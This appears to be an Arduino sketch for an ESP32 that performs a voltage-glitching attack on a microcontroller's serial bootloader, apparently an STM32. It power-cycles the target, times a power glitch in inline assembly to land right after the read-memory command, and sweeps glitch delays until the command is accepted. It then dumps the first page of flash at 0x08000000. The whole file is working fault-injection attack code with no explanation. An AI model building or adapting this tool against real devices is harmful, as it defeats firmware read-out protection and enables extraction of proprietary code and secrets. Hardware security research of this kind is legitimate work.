#include <Arduino.h>

#include "SoftwareSerial.h"

const uint32_t POWER_PIN_MASK = (1 << 25) | (1 << 26);

#define DUT_SERIAL_RX 19
#define DUT_SERIAL_TX 18

void inline IRAM_ATTR dutPowerOn() {
  REG_WRITE(GPIO_OUT_W1TS_REG, POWER_PIN_MASK);
}

void inline dutPowerOff() { REG_WRITE(GPIO_OUT_W1TC_REG, POWER_PIN_MASK); }

void IRAM_ATTR asmGlitch() {
  asm volatile(
      "movi a7, 0x6000000  \n\t"
      "movi a8, 0x3ff4400c \n\t"
      "movi a9, 0x3ff44008 \n\t"
      "s32i a7, a8, 0      \n\t"
      "s32i a7, a9, 0      \n\t"
      :::"a7", "a8", "a9");
}

// Glitch width is around 80 nanos, measured with a scope.
// void IRAM_ATTR glitch() {
//   dutPowerOff();
//   dutPowerOn();
// }

void inline IRAM_ATTR checksumBytes(uint8_t* bytes, int size) {
  if (size == 1) {
    bytes[1] = ~bytes[0];
    return;
  }
  uint8_t checksum = 0;
  for (int i = 0; i < size; i++) {
    checksum ^= bytes[i];
  }
  bytes[size] = checksum;
}

SoftwareSerial DutSerialTx;
SoftwareSerial DutSerialRx;
const uint8_t READ_MEM_BYTES[] = {0x11, 0xEE};
void IRAM_ATTR powerCycleDut();

bool IRAM_ATTR readAck(const char* message) {
  uint8_t responseByte = 0;
  DutSerialRx.setTimeout(10);
  int readBytesNum = DutSerialRx.readBytes(&responseByte, 1);
  if (readBytesNum != 1) {
    Serial.printf(
        "Didn't get any response waiting for [N]ACK, power cycling DUT\n");
    powerCycleDut();
    return false;
  }
  boolean ack = (responseByte == 0x79);
  Serial.printf("%s response %d bytes: %s\n", message, readBytesNum,
                ack ? "ACK" : "NACK");
  return ack;
}

void IRAM_ATTR powerCycleDut() {
  dutPowerOff();
  delay(10);
  dutPowerOn();
  delay(10);
  DutSerialTx.write(0x7F);
  readAck("Handshake");
}

void IRAM_ATTR setup() {
  pinMode(25, OUTPUT);
  pinMode(26, OUTPUT);
  setCpuFrequencyMhz(240);
  Serial.begin(115200);
  DutSerialTx.begin(9600, SWSERIAL_8E1, -1, DUT_SERIAL_TX);
  DutSerialTx.enableTx(true);
  DutSerialRx.begin(9600, SWSERIAL_8E1, DUT_SERIAL_RX, -1);
  DutSerialRx.enableRx(true);
  powerCycleDut();
}

uint32_t sendAndGlitchWithDelay(const uint8_t* bytes, size_t len,
                                uint32_t delay) {
  portMUX_TYPE mux = portMUX_INITIALIZER_UNLOCKED;
  taskENTER_CRITICAL(&mux);
  DutSerialTx.write(bytes, len);
  uint32_t startCycleCount = ESP.getCycleCount();
  for (int i = 0; i < delay; i++) {
    asm volatile("");
  }
  uint32_t endCycleCount = ESP.getCycleCount();
  asmGlitch();
  taskEXIT_CRITICAL(&mux);
  return endCycleCount - startCycleCount;
}

boolean readFirstpage(uint32_t delay) {
  auto cycles =
      sendAndGlitchWithDelay(READ_MEM_BYTES, sizeof(READ_MEM_BYTES), delay);
  char message[256];
  snprintf(message, sizeof(message), "%d, %d: Read Mem", delay, cycles);
  if (!readAck(message)) {
    return false;
  }

  // Offset = 0x8000000
  uint8_t memAddress[5] = {8, 0, 0, 0, 0};
  checksumBytes(memAddress, 4);
  DutSerialTx.write(memAddress, sizeof(memAddress));
  if (!readAck("Sent mem address")) {
    return false;
  }

  uint8_t memLength[2] = {4, 0};
  checksumBytes(memLength, 1);
  sendAndGlitchWithDelay(memLength, sizeof(memLength), delay);
  if (!readAck("Sent mem length")) {
    return false;
  }

  uint8_t memBytes[256];
  DutSerialRx.setTimeout(50000);
  int readBytesNum = DutSerialRx.readBytes(memBytes, sizeof(memBytes));
  Serial.printf("Received %d memory bytes:\n", readBytesNum);
  if (readBytesNum == 0) {
    return false;
  }

  for (int i = 0; i < readBytesNum; i++) {
    Serial.printf("%2x", memBytes[i]);
    if (i % 16 == 15) {
      Serial.write('\n');
      continue;
    }
    if (i % 2 == 1) {
      Serial.write(' ');
    }
  }
  return true;
}

void IRAM_ATTR loop() {

  for (int j = 30; j < 80; j++) {
    if (readFirstpage(j)) {
      while (true)
        ;
    }
  }
}